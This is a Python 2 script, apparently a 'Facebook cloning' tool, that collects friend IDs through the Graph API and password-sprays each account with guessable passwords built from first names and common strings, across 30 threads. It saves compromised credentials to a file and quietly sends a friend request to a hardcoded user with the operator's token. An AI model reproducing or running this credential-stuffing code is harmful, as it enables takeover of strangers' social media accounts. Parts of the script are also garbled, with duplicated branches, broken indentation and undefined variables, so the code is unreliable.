#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Tech Qaiser
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)
		
logo = """
\033[0;31m░██████╗░░█████╗░██╗░██████╗███████╗██████╗░
\033[0;31m██╔═══██╗██╔══██╗██║██╔════╝██╔════╝██╔══██╗
\033[0;31m██║██╗██║███████║██║╚█████╗░█████╗░░██████╔╝
\033[0;31m╚██████╔╝██╔══██║██║░╚═══██╗██╔══╝░░██╔══██╗
\033[0;31m░╚═██╔═╝░██║░░██║██║██████╔╝███████╗██║░░██║
\033[0;31m░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝

\033[0;33m===========================

Github :- https:-github.com/TechQaiser/
Facebook :- Qaiser Abbas
Youtube :- Tech Qaiser
Note :- I am Not responsible For Any Miss Use

\033[0;32m==========================

"""
logo2 = """
\033[0;31m░██████╗░░█████╗░██╗░██████╗███████╗██████╗░
\033[0;31m██╔═══██╗██╔══██╗██║██╔════╝██╔════╝██╔══██╗
\033[0;31m██║██╗██║███████║██║╚█████╗░█████╗░░██████╔╝
\033[0;31m╚██████╔╝██╔══██║██║░╚═══██╗██╔══╝░░██╔══██╗
\033[0;31m░╚═██╔═╝░██║░░██║██║██████╔╝███████╗██║░░██║
\033[0;31m░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝

\033[0;33m===========================

Github :- https:-github.com/TechQaiser/
Facebook :- Qaiser Abbas
Youtube :- Tech Qaiser
Note :- I am Not responsible For Any Miss Use

\033[0;32m==========================

"""

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;93mPlease Wait \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
	
print """
\033[0;31m╭━━━╮
\033[0;31m┃╭━╮┃
\033[0;31m┃┃╱┃┣━━┳┳━━┳━━┳━╮
\033[0;31m┃┃╱┃┃╭╮┣┫━━┫┃━┫╭╯
\033[0;31m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
\033[0;31m╰━━╮┣╯╰┻┻━━┻━━┻╯
\033[0;31m╱╱╱╰╯

GITHUB :- https://github.com/TechQaiser

FACEBOOK :- Qaiser Abbas

YOUTUBE :-  Tech Qaiser

DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

NOTE  :- Need First Hand GirlFriend :-)"""

CorrectUsername = 'Qaiser'
CorrectPassword = 'Qaiser'
loop = 'true'
while loop == 'true':
    username = raw_input('\x1b[1;91m\xf0\x9f\x94\x90 \x1b[1;91mTool Username \x1b[1;91m\xc2\xbb\xc2\xbb \x1b[1;93m')
    if username == CorrectUsername:
        password = raw_input('\x1b[1;94m\xf0\x9f\x94\x90 \x1b[1;91mTool Password \x1b[1;91m\xc2\xbb\xc2\xbb \x1b[1;92m')
        if password == CorrectPassword:
            print 'Logged in successfully as ' + username
            time.sleep(2)
            loop = 'false'
        else:
            print '\x1b[1;91mWrong Password'
            os.system('xdg-open https://www.youtube.com/channel/UCKQ85sgFrddygumAGP8b5pQ')
    else:
        print '\x1b[1;94mWrong Username'
        os.system('xdg-open https://www.youtube.com/channel/UCKQ85sgFrddygumAGP8b5pQ')

def login():
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo2
        jalan('\x1b[1;97m=======================================================')
        jalan(' \x1b[1;92mWarning: \x1b[1;97mDo Not Use Your Personal Account')
        jalan(' \x1b[1;92mNote   : \x1b[1;97mUse a Fresh Account To Login')
        jalan('\x1b[1;97m=======================================================')
        id = raw_input('\x1b[1;96m[+] \x1b[1;92mID/Email\x1b[1;95m: \x1b[1;96m')
        pwd = raw_input('\x1b[1;96m[+] \x1b[1;93mPassword\x1b[1;96m: \x1b[1;96m')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;96mThere is no internet connection'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;95mLogin Successful...'
                os.system('xdg-open https://www.youtube.com/channel/UCKQ85sgFrddygumAGP8b5pQ')
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;91mThere is no internet connection'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;92mYour Account is on Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;93mPassword/Email is wrong'
            os.system('rm -rf login.txt')
            time.sleep(1)                                     
print '\n\x1b[1;93mPassword/Email is wrong'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;91mYour Account is on Checkpoint'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;92mThere is no internet connection'
        keluar()

    os.system('clear')
    print logo
    print '_______________________________________________________'
    print '\t\t\x1b[1;93m     User Logged In'
    print '\t\t\x1b[1;94m Name\x1b[1;93m:\x1b[1;92m ' + nama + ''
    print '\t\t\x1b[1;97m ID  \x1b[1;93m:\x1b[1;92m ' + id + ''
    print '_______________________________________________________'
    print '\x1b[1;93m>\x1b[1;93m>\x1b[1;93m1.\x1b[1;93mStart Cloning...'
    print '\x1b[1;91m>\x1b[1;91m>\x1b[1;91m0.\x1b[1;91mExit'
    pilih()


def pilih():
    unikers = raw_input('\n\x1b[1;97mChoose an Option>>> \x1b[1;97m')
    if unikers == '':
        print '\x1b[1;91mFill in correctly'
        pilih()
    elif unikers == '1':
        super()
    elif unikers == '0':
        jalan('Token Removed')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;91mFill in correctly'
        pilih()


def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;93m1.\x1b[1;93mClone From Friend List...'
    print '\x1b[1;93m2.\x1b[1;93mClone From Public ID...'
    print '\x1b[1;91m0.\x1b[1;91mBack'
    pilih_super()


def pilih_super():
    global cekpoint
    global oks
    peak = raw_input('\n\x1b[1;97mChoose an Option>>> \x1b[1;97m')
    if peak == '':
        print '\x1b[1;91mFill in correctly'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            jalan('\x1b[1;93mGetting IDs \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif peak == '2':
            os.system('clear')
            print logo
            idt = raw_input('\x1b[1;96m[*] \x1b[1;92mEnter ID\x1b[1;93m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;93mName\x1b[1;93m:\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;92mID Not Found!'
                raw_input('\n\x1b[1;96m[\x1b[1;94mBack\x1b[1;96m]')
                super()

            print '\x1b[1;93mGetting IDs\x1b[1;93m...'
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif peak == '0':
        for i in z['data']:
                id.append(i['id'])

        elif peak == '0':
            menu()
        else:
            print '\x1b[1;91mFill in correctly'
            pilih_super()
        print '\x1b[1;91mTotal IDs\x1b[1;93m: \x1b[1;94m' + str(len(id))
        jalan('\x1b[1;92mPlease Wait\x1b[1;92m...')
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;91mCloning\x1b[1;93m' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;94m        ~     \x1b[1;93m*To Stop Process Press CTRL+Z*\x1b[1;94m    ~'
    print ' \x1b[1;97m\n====================\x1b[1;91m[Mr TRICKSTER]\x1b[1;97m====================='
    jalan(' \x1b[1;93mCloning Started  Wait...')
    print '\x1b[1;97m====================\x1b[1;91m[Mr TRICKSTER]\x1b[1;97m====================='

    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = '786786'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;94m| \x1b[1;92m ' + pass1
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;95m[CP] \x1b[1;97m ' + user + ' \x1b[1;94m| \x1b[1;97m ' + pass1
                cek = open('out/CP.txt', 'a')
                cek.write(user + '|' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = 'Pakistan'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;94m| \x1b[1;92m ' + pass2
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;95m[CP] \x1b[1;97m ' + user + ' \x1b[1;94m| \x1b[1;97m ' + pass2
                    cek = open('out/CP.txt', 'a')
                    cek.write(user + '|' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;94m| \x1b[1;92m ' + pass3
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;95m[CP] \x1b[1;97m ' + user + ' \x1b[1;94m| \x1b[1;97m ' + pass3
                        cek = open('out/[CP].txt', 'a')
                        cek.write(user + '|' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = b['first_name'] + '123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;94m| \x1b[1;92m ' + pass4
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;95m[CP] \x1b[1;97m ' + user + ' \x1b[1;94m| \x1b[1;97m ' + pass4
                            cek = open('out/CP.txt', 'a')
                            cek.write(user + '|' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = b['first_name'] + '786'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;94m| \x1b[1;92m ' + pass5
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;95m[CP] \x1b[1;97m ' + user + ' \x1b[1;94m| \x1b[1;97m ' + pass5
                                cek = open('out/CP.txt', 'a')
                                cek.write(user + '|' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = 'Pakistan1'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;94m| \x1b[1;92m ' + pass6
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;95m[CP] \x1b[1;97m ' + user + ' \x1b[1;94m| \x1b[1;97m ' + pass6
                                    cek = open('out/CP.txt', 'a')
                                    cek.write(user + '|' + pass6 + '\n')
                                    cek.close()
                                    print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;94m| \x1b[1;92m ' + pass6
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;95m[CP] \x1b[1;97m ' + user + ' \x1b[1;94m| \x1b[1;97m ' + pass6
                                    cek = open('out/CP.txt', 'a')
                                    cek.write(user + '|' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                                    b = json.loads(a.text)
                                    pass7 = b['first_name'] + '1234'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;94m| \x1b[1;92m ' + pass7
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;95m[CP] \x1b[1;97m ' + user + ' \x1b[1;94m| \x1b[1;97m ' + pass7
                                        cek = open('out/CP.txt', 'a')
                                        cek.write(user + '|' + pass7 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass7)
                                    else:
                                        pass8 = b['first_name'] + '1122'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;94m| \x1b[1;92m ' + pass8
                                            oks.append(user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;95m[CP] \x1b[1;97m ' + user + ' \x1b[1;94m| \x1b[1;97m ' + pass8
                                            cek = open('out/CP.txt', 'a')
                                            cek.write(user + '|' + pass8 + '\n')
                                            cek.close()
                                            cekpoint.append(user + pass8)
                                        else:
                                            pass9 = 'password1'
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;94m| \x1b[1;92m ' + pass9
                                                oks.append(user + pass9)
                                            elif 'www.facebook.com' in q['error_msg']:
                                                print '\x1b[1;95m[CP] \x1b[1;97m ' + user + ' \x1b[1;94m| \x1b[1;97m ' + pass9
                                                cek = open('out/CP.txt', 'a')
                                                cek.write(user + '|' + pass9 + '\n')
                                                cek.close()
                                                cekpoint.append(user + pass9)
                                            else:
                                                pass10 = b['first_name'] + '12'
                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                q = json.load(data)
                                                if 'access_token' in q:
                                                    print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;94m| \x1b[1;92m ' + pass10
                                                    oks.append(user + pass10)
                                                elif 'www.facebook.com' in q['error_msg']:
                                                    print '\x1b[1;95m[CP] \x1b[1;97m ' + user + ' \x1b[1;94m| \x1b[1;97m ' + pass10
                                                    cek = open('out/CP.txt', 'a')
                                                    cek.write(user + '|' + pass10 + '\n')
                                                    cek.close()
                                                    cekpoint.append(user + pass10)
                                                else:
                                                    pass11 = b['first_name'] + '007'
                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;94m| \x1b[1;92m ' + pass11
                                                        oks.append(user + pass11)
                                                    elif 'www.facebook.com' in q['error_msg']:
                                                        print '\x1b[1;95m[CP] \x1b[1;97m ' + user + ' \x1b[1;94m| \x1b[1;97m ' + pass11
                                                        cek = open('out/CP.txt', 'a')
                                                        cek.write(user + '|' + pass11 + '\n')
                                                        cek.close()
                                                        cekpoint.append(user + pass11)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;91mProcess Has Been Completed\x1b[1;92m....'
    print '\x1b[1;91mTotal OK/\x1b[1;93mCP \x1b[1;91m: \x1b[1;91m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;95m' + str(len(cekpoint))
    print '\n \n         \x1b[1;33;40m-GoodBye\n\n\x1b[1;97m=====================\x1b[1;91m[Mr TRICKSTER]\x1b[1;97m===========================================================================\n           \n\n\x1b[1;31;40m              @@@@@@           @@@@@@\n             @@@@@@@@@@       @@@@@@@@@@\n    \t   @@@@@@@@@@@@@@   @@@@@@@@@@@@@@\n         @@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@\n        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n             @@@@@@@@@@@@@@@@@@@@@@@@@@@\n               @@@@@@@@@@@@@@@@@@@@@@@\n                 @@@@@@@@@@@@@@@@@@@\n                   @@@@@@@@@@@@@@@\n                     @@@@@@@@@@@\n                       @@@@@@@\n                         @@@\n                          @\n\n           '
    raw_input('\n\x1b[1;92m[\x1b[1;94mBack\x1b[1;96m]')
    menu()
    
    if __name__ == '__main__':
    
